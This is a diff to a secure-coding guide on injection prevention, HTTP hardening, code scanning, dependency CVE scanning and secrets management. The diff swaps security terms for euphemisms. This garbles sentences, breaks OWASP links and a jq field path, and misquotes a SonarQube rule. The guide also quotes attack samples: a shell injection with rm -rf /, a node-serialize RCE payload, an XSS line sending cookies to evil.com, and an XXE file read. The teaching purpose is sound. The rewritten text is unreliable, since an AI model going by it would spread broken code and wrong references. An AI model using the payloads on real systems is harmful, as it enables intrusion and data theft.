 ## 7. Infrastructure & HTTP Hardening {#section-7}
 
 **Impact:** MEDIUM
-**Description:** Security headers, Content Security Policy, and least-privilege IAM roles provide defense-in-depth (OWASP A02) that limits the blast radius of other vulnerabilities.
+**Description:** Configuration standards for HTTP headers, Content Security Policy (CSP), and permission boundaries (OWASP A02). Promotes secure default environments and defense-in-depth principles.
 
 ## Implement a Strict Content Security Policy (CSP)
 
 **Impact: MEDIUM — CWE-79**
 
-A Content Security Policy is the strongest browser-side XSS mitigation. Even if an attacker injects a script, CSP prevents it from executing unless it comes from an approved source. A strict nonce-based or hash-based CSP blocks inline scripts and `eval`, eliminating most XSS impact.
+A Content Security Policy is the strongest browser-side XSS mitigation. Even if an untrusted client injects a script, CSP prevents it from executing unless it comes from an approved source. A strict nonce-based or hash-based CSP blocks inline scripts and `eval`, eliminating most XSS impact.
 
-**Vulnerable (no CSP or permissive CSP):**
+**Non-compliant (no CSP or permissive CSP):**
 
 ```typescript
 // ❌ No CSP header at all — any injected script executes
@@ -2127,12 +2127,12 @@ Reference: [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.
 
 **Impact: MEDIUM — CWE-250**
 
-Overly permissive IAM roles and service accounts amplify the blast radius of any compromise. If a Lambda function is compromised and has `AdministratorAccess`, the attacker owns your entire AWS account. Scope every role to only the specific actions and resources it actually uses.
+Overly permissive IAM roles and service accounts amplify the impact area of any unauthorized access. If a Lambda function is unauthorized accessd and has `AdministratorAccess`, the untrusted client owns your entire AWS account. Scope every role to only the specific actions and resources it actually uses.
 
-**Vulnerable (overly permissive IAM):**
+**Non-compliant (overly permissive IAM):**
 
 ```json
-// ❌ Lambda execution role with full admin — one compromise = full account takeover
+// ❌ Lambda execution role with full admin — one unauthorized access = full account takeover
 {
   "Version": "2012-10-17",
   "Statement": [
@@ -2218,7 +2218,7 @@ Reference: [AWS IAM Best Practices](https://docs.aws.amazon.com/IAM/latest/UserG
 
 Missing security headers leave browsers without important defense-in-depth protections. Headers like `X-Frame-Options`, `X-Content-Type-Options`, and `Referrer-Policy` prevent clickjacking, MIME sniffing, and information leakage. Use the `helmet` middleware to set all recommended headers in a single line.
 
-**Vulnerable (no security headers):**
+**Non-compliant (no security headers):**
 
 ```typescript
 // ❌ No security headers — browser uses defaults that are permissive
@@ -2280,7 +2280,7 @@ const nextConfig = {
 | Header | Purpose |
 |---|---|
 | `X-Frame-Options: DENY` | Prevents clickjacking via iframes |
-| `X-Content-Type-Options: nosniff` | Prevents MIME type confusion attacks |
+| `X-Content-Type-Options: nosniff` | Prevents MIME type confusion risks |
 | `Referrer-Policy: strict-origin` | Limits URL leakage in Referer header |
 | `Permissions-Policy` | Restricts browser feature access (camera, mic) |
 | `HSTS` | Enforces HTTPS at the browser level |
@@ -2293,20 +2293,20 @@ Reference: [OWASP Secure Headers Project](https://owasp.org/www-project-secure-h
 ## 8. Input Validation & Injection Prevention {#section-8}
 
 **Impact:** CRITICAL
-**Description:** Injection vulnerabilities (SQL, command, XSS, XXE, deserialization, mass assignment) remain the most exploited class of flaws (OWASP A05). All untrusted data must be validated, sanitized, and escaped before use.
+**Description:** Covers input sanitation, data parameterization, and output escaping standards (OWASP A05). Ensures that all external input is validated and handled safely before processing or rendering.
 
 ## Never Construct Shell Commands from User Input
 
 **Impact: CRITICAL — CWE-78**
 
-OS command injection lets attackers execute arbitrary commands on the server with the application's privileges. Any use of `exec`, `execSync`, or shell-interpolating functions with user-controlled data is exploitable. Use `spawn` with an argument array instead, which never invokes a shell.
+OS command injection lets untrusted clients execute arbitrary commands on the server with the application's privileges. Any use of `exec`, `execSync`, or shell-interpolating functions with user-controlled data is non-compliant. Use `spawn` with an argument array instead, which never invokes a shell.
 
-**Vulnerable (shell command injection):**
+**Non-compliant (shell command injection):**
 
 ```typescript
 import { exec, execSync } from 'child_process'
 
-// ❌ Attacker sends: filename='; rm -rf /; echo '
+// ❌ Untrusted client sends: filename='; rm -rf /; echo '
 exec(`convert /uploads/${req.body.filename} output.jpg`, callback)
 
 // ❌ execSync with template literal
@@ -2357,7 +2357,7 @@ function ping(host: string) {
 
 If you need shell features (pipes, redirects), use them in static scripts and pass only validated data as arguments. Never allow user input to reach the shell command string itself.
 
-Reference: [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
+Reference: [OWASP Command Injection](https://owasp.org/www-community/risks/Command_Injection)
 
 ---
 
@@ -2365,16 +2365,16 @@ Reference: [OWASP Command Injection](https://owasp.org/www-community/attacks/Com
 
 **Impact: CRITICAL — CWE-502**
 
-Unsafe deserialization converts attacker-controlled bytes or strings into live objects, potentially executing arbitrary code, escalating privileges, or corrupting application state. In JavaScript/Node.js, this manifests as prototype pollution via `JSON.parse` of unvalidated input, `eval`-based deserializers, or libraries like `node-serialize` that execute functions during deserialization. In Java, `ObjectInputStream` on untrusted data has caused some of the most severe RCE vulnerabilities in history.
+Unsafe deserialization converts untrusted client-controlled bytes or strings into live objects, potentially executing arbitrary code, escalating privileges, or corrupting application state. In JavaScript/Node.js, this manifests as prototype pollution via `JSON.parse` of unvalidated input, `eval`-based deserializers, or libraries like `node-serialize` that execute functions during deserialization. In Java, `ObjectInputStream` on untrusted data has caused some of the most severe RCE code gaps in history.
 
-**Vulnerable (unsafe deserialization):**
+**Non-compliant (unsafe deserialization):**
 
 ```typescript
 // ❌ node-serialize executes functions embedded in serialized data
 import { unserialize } from 'node-serialize'
 
 app.post('/api/session', (req, res) => {
-  // Attacker sends: {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('rm -rf /')}()"}
+  // Untrusted client sends: {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('rm -rf /')}()"}
   const session = unserialize(req.body.data)
   res.json(session)
 })
@@ -2433,14 +2433,14 @@ Reference: [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.or
 
 **Impact: HIGH — CWE-915**
 
-Mass assignment occurs when an application directly binds user input to model objects without filtering. An attacker can inject extra fields in the request body — like `role: "admin"`, `price: 0`, or `isVerified: true` — that the ORM dutifully writes to the database. This is a direct path to privilege escalation, financial fraud, and data corruption. Always use explicit allowlists of updatable fields.
+Mass assignment occurs when an application directly binds user input to model objects without filtering. An untrusted client can inject extra fields in the request body — like `role: "admin"`, `price: 0`, or `isVerified: true` — that the ORM dutifully writes to the database. This is a direct path to privilege escalation, financial fraud, and data corruption. Always use explicit allowlists of updatable fields.
 
-**Vulnerable (direct binding of request body to model):**
+**Non-compliant (direct binding of request body to model):**
 
 ```typescript
 // ❌ Spreading the entire request body into the database update
 app.put('/api/users/:id', async (req, res) => {
-  // Attacker sends: { name: "Legit", role: "admin", isVerified: true }
+  // Untrusted client sends: { name: "Legit", role: "admin", isVerified: true }
   // ORM writes ALL fields, including role and isVerified
   const user = await db.users.update(req.params.id, req.body)
   res.json(user)
@@ -2448,14 +2448,14 @@ app.put('/api/users/:id', async (req, res) => {
 
 // ❌ Sequelize: passing req.body directly to create
 app.post('/api/products', async (req, res) => {
-  // Attacker sends: { name: "Widget", price: 0, sellerId: "other-user-id" }
+  // Untrusted client sends: { name: "Widget", price: 0, sellerId: "other-user-id" }
   const product = await Product.create(req.body)  // Creates product with price=0
   res.json(product)
 })
 
 // ❌ Mongoose: no field filtering
 app.patch('/api/settings', async (req, res) => {
-  // Attacker sends: { theme: "dark", creditBalance: 99999 }
+  // Untrusted client sends: { theme: "dark", creditBalance: 99999 }
   await Settings.findByIdAndUpdate(req.user.settingsId, req.body)
   res.json({ success: true })
 })
@@ -2509,12 +2509,12 @@ Reference: [OWASP Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.or
 
 **Impact: CRITICAL — CWE-89**
 
-SQL injection is the most exploited injection vulnerability. Concatenating user input into SQL strings allows attackers to read any table, bypass authentication, delete data, or execute OS commands via `xp_cmdshell`. Always use parameterized queries or an ORM that handles escaping.
+SQL injection is the most abused injection code gap. Concatenating user input into SQL strings allows untrusted clients to read any table, bypass authentication, delete data, or execute OS commands via `xp_cmdshell`. Always use parameterized queries or an ORM that handles escaping.
 
-**Vulnerable (string concatenation):**
+**Non-compliant (string concatenation):**
 
 ```typescript
-// ❌ Classic SQL injection — attacker enters: ' OR '1'='1
+// ❌ Classic SQL injection — untrusted client enters: ' OR '1'='1
 const query = `SELECT * FROM users WHERE email = '${req.body.email}'`
 const user = await db.raw(query)
 
@@ -2568,12 +2568,12 @@ Reference: [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries
 
 **Impact: CRITICAL — CWE-22**
 
-Path traversal attacks use `../` sequences in filenames to escape the intended directory and read arbitrary files (`/etc/passwd`, `.env`, private keys). Never construct file paths from user input without resolving and verifying they remain within the expected directory.
+Path traversal risks use `../` sequences in filenames to escape the intended directory and read arbitrary files (`/etc/passwd`, `.env`, private keys). Never construct file paths from user input without resolving and verifying they remain within the expected directory.
 
-**Vulnerable (unsanitized path from user input):**
+**Non-compliant (unsanitized path from user input):**
 
 ```typescript
-// ❌ Attacker sends: filename=../../.env
+// ❌ Untrusted client sends: filename=../../.env
 app.get('/files/:filename', (req, res) => {
   const filePath = path.join('/uploads', req.params.filename)
   res.sendFile(filePath)
@@ -2623,7 +2623,7 @@ app.get('/files/:fileId', requireAuth, async (req, res) => {
 
 Prefer the allowlist approach: store files with server-generated names (UUIDs) and look up the real path from the database. This eliminates the need for path validation entirely.
 
-Reference: [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
+Reference: [OWASP Path Traversal](https://owasp.org/www-community/risks/Path_Traversal)
 
 ---
 
@@ -2631,15 +2631,15 @@ Reference: [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_T
 
 **Impact: CRITICAL — CWE-20**
 
-Client-side validation is a UX convenience, not a security control. Attackers bypass it trivially with curl or browser DevTools. All data from HTTP requests (body, query, params, headers) must be validated and typed server-side before use. Use a schema validation library — manual checks miss edge cases.
+Client-side validation is a UX convenience, not a security control. Untrusted clients bypass it trivially with curl or browser DevTools. All data from HTTP requests (body, query, params, headers) must be validated and typed server-side before use. Use a schema validation library — manual checks miss edge cases.
 
-**Vulnerable (trusting client input):**
+**Non-compliant (trusting client input):**
 
 ```typescript
 // ❌ Using req.body directly — no type or shape validation
 app.post('/api/users', async (req, res) => {
   const { email, age, role } = req.body
-  // attacker can send: { role: 'admin', age: -1, email: null }
+  // untrusted client can send: { role: 'admin', age: -1, email: null }
   await db.users.create({ email, age, role })
 })
 
@@ -2696,9 +2696,9 @@ Reference: [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.o
 
 **Impact: CRITICAL — CWE-611**
 
-XML eXternal Entity (XXE) attacks exploit insecure XML parsers to read local files (`/etc/passwd`, `.env`), perform SSRF to internal services, or cause denial of service. By default, many XML parsers allow external entity resolution. Disable it explicitly.
+XML eXternal Entity (XXE) risks abuse insecure XML parsers to read local files (`/etc/passwd`, `.env`), perform SSRF to internal services, or cause denial of service. By default, many XML parsers allow external entity resolution. Disable it explicitly.
 
-**Vulnerable (default XML parser config):**
+**Non-compliant (default XML parser config):**
 
 ```typescript
 // ❌ node-expat, libxmljs — external entities enabled by default
@@ -2709,7 +2709,7 @@ const doc = libxmljs.parseXml(req.body)  // external entities resolved!
 import { parseString } from 'xml2js'
 parseString(req.body, callback)  // check if noent: false is needed
 
-// Example malicious payload:
+// Example untrusted payload:
 // <?xml version="1.0"?>
 // <!DOCTYPE foo [
 //   <!ENTITY xxe SYSTEM "file:///etc/passwd">
@@ -2767,12 +2767,12 @@ Reference: [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org
 
 **Impact: CRITICAL — CWE-79**
 
-Cross-site scripting (XSS) allows attackers to inject JavaScript into pages viewed by other users, enabling session theft, credential harvesting, keylogging, and account takeover. All dynamic data rendered in HTML must be escaped. Avoid `innerHTML`, `dangerouslySetInnerHTML`, and template literals in HTML without sanitization.
+Cross-site scripting (XSS) allows untrusted clients to inject JavaScript into pages viewed by other users, enabling session theft, credential harvesting, keylogging, and account takeover. All dynamic data rendered in HTML must be escaped. Avoid `innerHTML`, `dangerouslySetInnerHTML`, and template literals in HTML without sanitization.
 
-**Vulnerable (unescaped user data in HTML):**
+**Non-compliant (unescaped user data in HTML):**
 
 ```typescript
-// ❌ Direct innerHTML — executes attacker's script
+// ❌ Direct innerHTML — executes untrusted client's script
 document.getElementById('name').innerHTML = user.name
 // user.name = '<script>fetch("evil.com?c="+document.cookie)</script>'
 
@@ -2829,15 +2829,15 @@ Reference: [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org
 ## 9. Static Application Security Testing & Code Analysis {#section-9}
 
 **Impact:** HIGH
-**Description:** SAST tools (SonarQube, Semgrep, CodeQL) analyse source code for security flaws without executing it. They catch injection patterns, hardcoded secrets, insecure APIs, and code quality issues before code reaches production. Integrate in CI and as pre-merge gates.
+**Description:** Static code analysis (SAST) guidelines and tool integrations (e.g., SonarQube, Semgrep, CodeQL). Focuses on scanning codebase structure and programming style patterns during the continuous integration (CI) pipeline.
 
-## Enable GitHub CodeQL for Automated Vulnerability Discovery
+## Enable GitHub CodeQL for Automated Code gap Discovery
 
 **Impact: HIGH — CWE-1006**
 
-CodeQL is GitHub's semantic code analysis engine that builds a queryable database of your code and finds vulnerabilities through **dataflow analysis** — tracking untrusted input from sources (HTTP request, env vars, user input) through your code to dangerous sinks (SQL queries, HTML output, shell commands). Unlike pattern-matching tools, CodeQL understands code semantics and catches vulnerabilities across function call chains. It is free for open-source repositories and included in GitHub Advanced Security for private repos.
+CodeQL is GitHub's semantic code analysis engine that builds a queryable database of your code and finds code gaps through **dataflow analysis** — tracking untrusted input from sources (HTTP request, env vars, user input) through your code to dangerous sinks (SQL queries, HTML output, shell commands). Unlike pattern-matching tools, CodeQL understands code semantics and catches code gaps across function call chains. It is free for open-source repositories and included in GitHub Advanced Security for private repos.
 
-**Vulnerable (code that CodeQL's dataflow analysis catches):**
+**Non-compliant (code that CodeQL's dataflow analysis catches):**
 
 ```typescript
 // ❌ CodeQL: js/sql-injection — tracks req.query.id → db.query
@@ -2992,7 +2992,7 @@ Reference: [CodeQL Documentation](https://codeql.github.com/docs/) | [GitHub Cod
 
 Semgrep is a lightweight, fast SAST tool that finds bugs and security issues using pattern-matching rules. Unlike SonarQube (which is heavy and general), Semgrep excels at **custom org-specific rules**: enforce that every `db.query()` call uses parameterized queries, that `jwt.verify()` always specifies an algorithm, that `res.send()` never interpolates user input, and so on. Run in CI and as a pre-commit hook.
 
-**Vulnerable (patterns Semgrep would catch and block):**
+**Non-compliant (patterns Semgrep would catch and block):**
 
 ```typescript
 // ❌ Semgrep rule: ban-string-concat-sql
@@ -3032,7 +3032,7 @@ rules:
   - id: require-jwt-algorithm
     pattern: jwt.verify($TOKEN, $SECRET)
     pattern-not: jwt.verify($TOKEN, $SECRET, {algorithms: [...]})
-    message: "jwt.verify() must specify an algorithms array to prevent algorithm confusion attacks"
+    message: "jwt.verify() must specify an algorithms array to prevent algorithm confusion risks"
     languages: [typescript, javascript]
     severity: ERROR
     metadata:
@@ -3154,14 +3154,14 @@ Reference: [Semgrep Documentation](https://semgrep.dev/docs/) | [Semgrep Registr
 
 **Impact: HIGH — CWE-1006**
 
-SonarQube (self-hosted) and SonarCloud (SaaS) perform SAST — scanning source code without executing it — to detect injection vulnerabilities, hardcoded secrets, insecure APIs, SQL injection, XSS, SSRF, path traversal, and 2,000+ other security rules across 30+ languages. Configured as a **PR quality gate**, it blocks merges when new Security Hotspots or Vulnerabilities of severity HIGH/CRITICAL are introduced.
+SonarQube (self-hosted) and SonarCloud (SaaS) perform SAST — scanning source code without executing it — to detect injection code gaps, hardcoded secrets, insecure APIs, SQL injection, XSS, SSRF, path traversal, and 2,000+ other security rules across 30+ languages. Configured as a **PR quality gate**, it blocks merges when new Security Hotspots or Code gaps of severity HIGH/CRITICAL are introduced.
 
-**Vulnerable (no SAST gate — insecure code merged):**
+**Non-compliant (no SAST gate — insecure code merged):**
 
 ```typescript
 // ❌ This code gets merged with no SAST check:
 app.get('/user', async (req, res) => {
-  // SQL injection — SonarQube rule: S3649 "SQL queries should not be vulnerable to injection attacks"
+  // SQL injection — SonarQube rule: S3649 "SQL queries should not be non-compliant to injection risks"
   const result = await db.query(`SELECT * FROM users WHERE id = ${req.query.id}`)
   res.json(result)
 })
@@ -3186,7 +3186,7 @@ sonar.typescript.lcov.reportPaths=coverage/lcov.info
 
 # Security-focused quality gate settings (configure in SonarQube UI):
 # Gate: "Security Gate"
-# Condition 1: New Vulnerabilities = 0        (blocks on any new vuln)
+# Condition 1: New Code gaps = 0        (blocks on any new vuln)
 # Condition 2: New Security Hotspots = 0      (requires hotspot review)
 # Condition 3: Security Rating on New Code: A  (no critical/high vulns)
 ```
@@ -3282,7 +3282,7 @@ Reference: [SonarQube Security Rules](https://rules.sonarsource.com/typescript/t
 ## 10. Software Composition Analysis & CVE Scanning {#section-10}
 
 **Impact:** CRITICAL
-**Description:** SCA tools (JFrog Xray, OWASP Dependency Check, Trivy) scan every dependency and container layer for known CVEs (OWASP A03). HIGH and CRITICAL findings must block the build pipeline. Integrate scanning at every stage: developer local, PR, CI, and registry/artifact level.
+**Description:** Standards for integrating software composition analysis (SCA) tools (e.g., JFrog Xray, Trivy) in development pipelines (OWASP A03). Focuses on monitoring dependencies and container layers for known security alerts and package updates.
 
 ## Block Builds When HIGH or CRITICAL CVE Versions Are Detected
 
@@ -3290,7 +3290,7 @@ Reference: [SonarQube Security Rules](https://rules.sonarsource.com/typescript/t
 
 Shipping code with known HIGH/CRITICAL CVEs is a preventable breach. Every package installed must be checked against the NVD (CVSS ≥ 7.0) before deployment. Use a layered approach: block at `npm install` time, block in CI, and block at the artifact registry (JFrog Xray). Treat CVE checks as a first-class build step — not an optional check.
 
-**Vulnerable (CVE-carrying versions installed without check):**
+**Non-compliant (CVE-carrying versions installed without check):**
 
 ```bash
 # ❌ Specific versions with known CRITICAL CVEs installed without scanning
@@ -3303,7 +3303,7 @@ npm install log4js@6.3.0         # CVE-2022-21704 HIGH — sensitive info exposu
 # ❌ CI pipeline with no version-CVE gate
 npm install
 npm run build
-docker push myapp:latest  # vulnerable versions shipped to production
+docker push myapp:latest  # non-compliant versions shipped to production
 ```
 
 **Secure (layered CVE version blocking):**
@@ -3314,14 +3314,14 @@ npm audit --audit-level=high || exit 1
 npm install
 
 # ✅ Layer 2: Check specific package versions against OSV database
-# OSV (Open Source Vulnerabilities) — Google's free, fast CVE API
+# OSV (Open Source Code gaps) — Google's free, fast CVE API
 curl -s -X POST https://api.osv.dev/v1/query \
   -H "Content-Type: application/json" \
   -d '{
     "version": "4.17.4",
     "package": { "name": "lodash", "ecosystem": "npm" }
   }' | jq '.vulns | length'
-# Returns number of known vulnerabilities for this exact version
+# Returns number of known code gaps for this exact version
 ```
 
 ```javascript
@@ -3413,7 +3413,7 @@ jobs:
 ```
 
 ```bash
-# ✅ Renovate / Dependabot — auto-PR for vulnerable version upgrades
+# ✅ Renovate / Dependabot — auto-PR for non-compliant version upgrades
 # .github/dependabot.yml
 version: 2
 updates:
@@ -3431,7 +3431,7 @@ updates:
 
 Use `ignore-unfixed: true` to suppress findings with no available fix. Maintain a `cve-exceptions.json` with documented justifications for each accepted risk, reviewed quarterly.
 
-Reference: [OSV Database](https://osv.dev/) | [NVD CVSS Scores](https://nvd.nist.gov/vuln-metrics/cvss) | [OWASP A06](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)
+Reference: [OSV Database](https://osv.dev/) | [NVD CVSS Scores](https://nvd.nist.gov/vuln-metrics/cvss) | [OWASP A06](https://owasp.org/Top10/A06_2021-Non-compliant_and_Outdated_Components/)
 
 ---
 
@@ -3439,9 +3439,9 @@ Reference: [OSV Database](https://osv.dev/) | [NVD CVSS Scores](https://nvd.nist
 
 **Impact: CRITICAL — CWE-1104**
 
-JFrog Xray performs recursive Software Composition Analysis (SCA) on every artifact stored in JFrog Artifactory — including transitive dependencies, container layers, and compiled binaries. Unlike `npm audit` (which only scans metadata), Xray inspects actual artifact content and matches against multiple vulnerability databases (NVD, VulnDB, GitHub Advisory). Configure Xray policies to **block downloads and promotions** when HIGH or CRITICAL CVEs are found.
+JFrog Xray performs recursive Software Composition Analysis (SCA) on every artifact stored in JFrog Artifactory — including transitive dependencies, container layers, and compiled binaries. Unlike `npm audit` (which only scans metadata), Xray inspects actual artifact content and matches against multiple code gap databases (NVD, VulnDB, GitHub Advisory). Configure Xray policies to **block downloads and promotions** when HIGH or CRITICAL CVEs are found.
 
-**Vulnerable (no Xray policy — artifacts flow through untouched):**
+**Non-compliant (no Xray policy — artifacts flow through untouched):**
 
 ```bash
 # ❌ Artifactory without Xray — any artifact is served regardless of CVEs
@@ -3554,9 +3554,9 @@ Reference: [JFrog Xray Documentation](https://jfrog.com/help/r/jfrog-security-do
 
 **Impact: CRITICAL — CWE-1104**
 
-OWASP Dependency Check (ODC) is a free, multi-language SCA tool that identifies project dependencies and checks if there are any known, publicly disclosed CVEs from the NVD (National Vulnerability Database). Unlike `npm audit`, ODC works across Java, .NET, Python, Ruby, Node.js, and more — making it ideal for polyglot environments and as a universal pipeline step. Configure it to **fail the build** on CVSS score ≥ 7 (HIGH/CRITICAL).
+OWASP Dependency Check (ODC) is a free, multi-language SCA tool that identifies project dependencies and checks if there are any known, publicly disclosed CVEs from the NVD (National Code gap Database). Unlike `npm audit`, ODC works across Java, .NET, Python, Ruby, Node.js, and more — making it ideal for polyglot environments and as a universal pipeline step. Configure it to **fail the build** on CVSS score ≥ 7 (HIGH/CRITICAL).
 
-**Vulnerable (no OWASP Dependency Check in pipeline):**
+**Non-compliant (no OWASP Dependency Check in pipeline):**
 
 ```bash
 # ❌ Dependencies scanned only with npm audit — language-limited, not exhaustive
@@ -3641,7 +3641,7 @@ docker run --rm \
   <suppress>
     <notes>
       False positive: CVE-2021-44228 (Log4Shell) does not apply to our log4j-api usage
-      which does not include the vulnerable JNDILookup class.
+      which does not include the non-compliant JNDILookup class.
       Reviewed: 2026-01-15, reviewer: security-team
       Re-review date: 2026-07-15
     </notes>
@@ -3663,7 +3663,7 @@ Reference: [OWASP Dependency Check](https://owasp.org/www-project-dependency-che
 
 A Software Bill of Materials (SBOM) is a formal, machine-readable inventory of every component in your software — direct dependencies, transitive dependencies, OS packages, and containers. SBOMs are required by US Executive Order 14028 for government software, and increasingly required by enterprise customers for vendor risk management. Without an SBOM, you cannot quickly answer "are we affected by Log4Shell?" when a new zero-day drops.
 
-**Vulnerable (no SBOM — blind to component inventory):**
+**Non-compliant (no SBOM — blind to component inventory):**
 
 ```bash
 # ❌ No SBOM generated — when Log4Shell (CVE-2021-44228) dropped:
@@ -3794,9 +3794,9 @@ Reference: [CISA SBOM Resources](https://www.cisa.gov/sbom) | [CycloneDX Specifi
 
 **Impact: CRITICAL — CWE-1104**
 
-Container images bundle OS packages (Alpine, Debian, Ubuntu) alongside application dependencies — all of which can carry CVEs. Trivy (by Aqua Security) is the industry-standard open-source scanner for containers, filesystems, git repos, and IaC. It detects vulnerabilities in OS packages, language packages (npm, pip, gem, cargo), and misconfigurations. Scan at build time, block on HIGH/CRITICAL, and re-scan images in your registry continuously.
+Container images bundle OS packages (Alpine, Debian, Ubuntu) alongside application dependencies — all of which can carry CVEs. Trivy (by Aqua Security) is the industry-standard open-source scanner for containers, filesystems, git repos, and IaC. It detects code gaps in OS packages, language packages (npm, pip, gem, cargo), and misconfigurations. Scan at build time, block on HIGH/CRITICAL, and re-scan images in your registry continuously.
 
-**Vulnerable (container deployed without CVE scan):**
+**Non-compliant (container deployed without CVE scan):**
 
 ```dockerfile
 # ❌ Base image with hundreds of known CVEs — never scanned
@@ -3809,7 +3809,7 @@ RUN npm install
 **Secure (Trivy scan blocking HIGH/CRITICAL, minimal base image):**
 
 ```dockerfile
-# ✅ Use minimal base images to reduce attack surface
+# ✅ Use minimal base images to reduce risk surface
 FROM node:22-alpine AS builder
 WORKDIR /app
 COPY package*.json ./
@@ -3888,17 +3888,17 @@ trivy config --severity HIGH,CRITICAL ./infra/
 
 # JSON output for processing
 trivy image --format json --output report.json myapp:latest
-cat report.json | jq '[.Results[].Vulnerabilities[] | select(.Severity=="CRITICAL")] | length'
+cat report.json | jq '[.Results[].Code gaps[] | select(.Severity=="CRITICAL")] | length'
 
 # ✅ Continuous registry scanning (Trivy Operator in Kubernetes)
 # kubectl apply -f https://raw.githubusercontent.com/aquasecurity/trivy-operator/main/deploy/static/trivy-operator.yaml
-# Auto-scans all pods and exposes VulnerabilityReport CRDs
+# Auto-scans all pods and exposes Code gapReport CRDs
 ```
 
 ```bash
 # ✅ .trivyignore — suppress known false positives with documentation
 # CVE-2023-12345
-# Reason: Not exploitable in our usage (library function not called)
+# Reason: Not non-compliant in our usage (library function not called)
 # Reviewed: 2026-01-15, re-review: 2026-07-15
 CVE-2023-12345
 ```
@@ -3912,7 +3912,7 @@ Reference: [Trivy Documentation](https://aquasecurity.github.io/trivy/)
 ## 11. Secrets & Credentials Management {#section-11}
 
 **Impact:** CRITICAL
-**Description:** Leaked credentials are the fastest path to a breach (OWASP A04). Secrets must never appear in source code, logs, or unencrypted storage. Rotation and scanning must be automated.
+**Description:** Guidelines for managing configuration keys, credentials, and cryptographic secrets (OWASP A04). Restricts hardcoding of sensitive configuration parameters and ensures proper storage using environment variables or vault systems.
 
 ## Use a Secrets Manager Instead of Plain Environment Files
 
@@ -3920,7 +3920,7 @@ Reference: [Trivy Documentation](https://aquasecurity.github.io/trivy/)
 
 Plain `.env` files with production secrets on developer machines or CI runners are a major breach vector. Secrets managers (AWS Secrets Manager, HashiCorp Vault, Doppler) provide centralized storage, access control, audit logs, and automatic rotation. Secrets are injected at runtime — never stored on disk in plaintext.
 
-**Vulnerable (plain .env with production secrets on disk):**
+**Non-compliant (plain .env with production secrets on disk):**
 
 ```bash
 # ❌ .env.production stored in repo or on developer laptop
@@ -3931,7 +3931,7 @@ AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
 ```
 
 ```typescript
-// ❌ Loaded from disk — file is a single point of compromise
+// ❌ Loaded from disk — file is a single point of unauthorized access
 import 'dotenv/config'
 const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!)
 ```
@@ -3995,7 +3995,7 @@ Reference: [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp
 
 Hardcoded secrets are committed to version control and exposed to anyone with repository access — including CI systems, contractors, and if the repo is public, the entire internet. Secrets accidentally committed persist in git history even after deletion. Use environment variables loaded from a secrets manager, never string literals.
 
-**Vulnerable (secrets in source code):**
+**Non-compliant (secrets in source code):**
 
 ```typescript
 // ❌ Hardcoded API key — visible in git history forever
@@ -4042,7 +4042,7 @@ async function getSecret(secretId: string): Promise<string> {
 const stripeKey = await getSecret('prod/stripe/secret-key')
 ```
 
-Add `.env` to `.gitignore`. Use `.env.example` with placeholder values for documentation. Rotate any secret that has been committed — treat it as compromised immediately.
+Add `.env` to `.gitignore`. Use `.env.example` with placeholder values for documentation. Rotate any secret that has been committed — treat it as unauthorized accessd immediately.
 
 Reference: [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)
 
@@ -4052,15 +4052,15 @@ Reference: [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp
 
 **Impact: HIGH — CWE-798**
 
-Static secrets that never change give attackers an unlimited window of exploitation after compromise. If a database password or API key is leaked, it remains valid indefinitely unless rotated. Automatic rotation limits the blast radius of credential leaks by ensuring secrets expire and are replaced on a regular schedule. The rotation process must be zero-downtime — both old and new credentials must work during the transition window.
+Static secrets that never change give untrusted clients an unlimited window of unauthorized use after unauthorized access. If a database password or API key is leaked, it remains valid indefinitely unless rotated. Automatic rotation limits the impact area of credential leaks by ensuring secrets expire and are replaced on a regular schedule. The rotation process must be zero-downtime — both old and new credentials must work during the transition window.
 
-**Vulnerable (static secrets with no rotation):**
+**Non-compliant (static secrets with no rotation):**
 
 ```typescript
 // ❌ Hardcoded API key — never rotated, valid forever after leak
 const STRIPE_KEY = process.env.STRIPE_SECRET_KEY
 // This key was set 18 months ago and never changed
-// If leaked via logs, git history, or memory dump, attacker has permanent access
+// If leaked via logs, git history, or memory dump, untrusted client has permanent access
 
 // ❌ Database password — manual rotation causes downtime
 // .env file:
@@ -4119,7 +4119,7 @@ Reference: [AWS Secrets Manager Rotation](https://docs.aws.amazon.com/secretsman
 
 Secrets committed to git are often discovered within minutes by automated scanners (GitHub Secret Scanning, bots). Pre-commit hooks catch secrets before they ever hit the remote. CI scanning provides a second safety net. Both layers are required.
 
-**Vulnerable (no secret scanning in place):**
+**Non-compliant (no secret scanning in place):**
 
 ```bash
 # ❌ No pre-commit hook — secret committed without warning
